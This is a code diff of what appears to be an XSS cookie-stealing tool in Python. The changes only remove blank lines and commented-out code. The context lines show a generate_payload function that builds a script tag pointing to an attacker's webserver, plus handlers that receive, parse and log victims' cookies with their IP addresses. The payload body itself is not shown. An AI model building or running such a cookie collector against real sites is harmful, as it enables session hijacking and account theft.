@@ -24,7 +24,6 @@ def banner():
     """
     print(banner)
 
-
 def generate_payload(webserver_url):
     payload = '<script type="text/javascript">'
     payload += "\n"
@@ -71,9 +70,6 @@ def parse_cookies(timedate, cookies_string, ip_addr):
     for key, value in cookie_data.items():
         print(f'{key}: {value}')
 
-
-    
-
 def write_cookie_log(timedate, cookie, ip_addr):
     time_date = timedate
     ip_address = ip_addr
@@ -102,13 +98,6 @@ class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
         print('\n')
         print(110 * '=')
         print('\n')
-
-
-        #query = urlparse(self.path).query
-        #cookies = parse_qs(query).get('c', [''])[0]
-        #print("Received cookies: ", cookies)
-
-        #self.wfile.write(f"Cookies received: {cookies}".encode('utf-8'))
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Start a webserver on a specified IP address and port.")
